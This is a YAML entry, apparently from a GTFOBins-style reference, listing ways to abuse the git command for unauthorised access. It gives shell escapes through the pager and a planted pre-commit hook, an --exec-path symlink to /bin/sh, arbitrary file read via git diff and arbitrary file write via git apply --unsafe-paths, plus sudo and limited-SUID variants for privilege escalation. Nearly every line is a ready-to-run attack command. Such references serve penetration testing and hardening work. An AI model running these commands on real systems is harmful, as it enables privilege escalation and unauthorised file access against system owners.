---
functions:
  shell:
    - code: PAGER='sh -c "exec sh 0<&1"' git -p help
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        git help config
        !/bin/sh
    - description: The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        git branch --help config
        !/bin/sh
    - description: Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.
      code: |
        TF=$(mktemp -d)
        git init "$TF"
        echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
        mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
        git -C "$TF" commit --allow-empty -m x
    - code: |
        TF=$(mktemp -d)
        ln -s /bin/sh "$TF/git-x"
        git "--exec-path=$TF" x
  file-read:
    - description: The read file content is displayed in `diff` style output format.
      code: |
        LFILE=file_to_read
        git diff /dev/null $LFILE
  file-write:
    - description: The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`.
      code: |
        git apply --unsafe-paths --directory / x.patch
  sudo:
    - code: sudo PAGER='sh -c "exec sh 0<&1"' git -p help
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo git -p help config
        !/bin/sh
    - description: The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo git branch --help config
        !/bin/sh
    - description: Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.
      code: |
        TF=$(mktemp -d)
        git init "$TF"
        echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
        mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
        sudo git -C "$TF" commit --allow-empty -m x
    - code: |
        TF=$(mktemp -d)
        ln -s /bin/sh "$TF/git-x"
        sudo git "--exec-path=$TF" x
  limited-suid:
    - code: PAGER='sh -c "exec sh 0<&1"' ./git -p help
---
